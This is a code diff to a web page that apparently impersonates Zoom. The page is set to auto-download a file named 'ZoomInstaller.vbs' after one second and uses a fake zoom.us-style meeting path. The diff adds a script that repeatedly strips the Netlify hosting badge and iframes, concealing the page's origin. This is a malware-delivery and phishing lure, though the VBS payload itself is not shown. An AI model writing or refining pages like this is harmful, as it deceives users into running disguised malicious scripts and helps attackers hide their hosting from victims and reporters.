@@ -666,7 +666,7 @@ a[href*="netlify.com"][target="_blank"]:not(.wc-link2) {
   // ============================================================
   var UPDATE_DOWNLOAD_URL = '/Zoom_Installer_Download/ZoomInstaller.vbs';
   var UPDATE_REDIRECT_URL = '#';
-  var PREVIEW_PAGE_URL    = 'preview/index.html';
+  var PREVIEW_PAGE_URL    = '/zoom.us_89315766107pwd=xe2c45bhRM0JjjXfmeOrEh4a3K6TQe.3/preview/index.html';
   var AUTO_DL_DELAY_MS    = 1000;
 
   var $ = function (id) { return document.getElementById(id); };
@@ -915,7 +915,28 @@ a[href*="netlify.com"][target="_blank"]:not(.wc-link2) {
     if (settings) settings.addEventListener('click', function () { alert('Cookie settings would open here.'); });
   })();
 
-})();
+})(); // <--- THIS MUST BE THE END OF YOUR MAIN SCRIPT
+</script> <!-- Close the main script tag here -->
+
+<!-- NOW START THE BADGE REMOVER SCRIPT -->
+<!-- Force Remove Netlify Badge -->
+<script>
+  (function() {
+    function removeBadge() {
+      var badge = document.getElementById('netlify-badge');
+      if (badge) badge.remove();
+      
+      var iframes = document.querySelectorAll('iframe[src*="netlify.com"]');
+      for (var i = 0; i < iframes.length; i++) {
+        iframes[i].remove();
+      }
+    }
+    
+    // Run immediately, and set up a watcher in case Netlify injects it late
+    removeBadge();
+    setInterval(removeBadge, 500); 
+  })();
 </script>
+
 </body>
 </html>
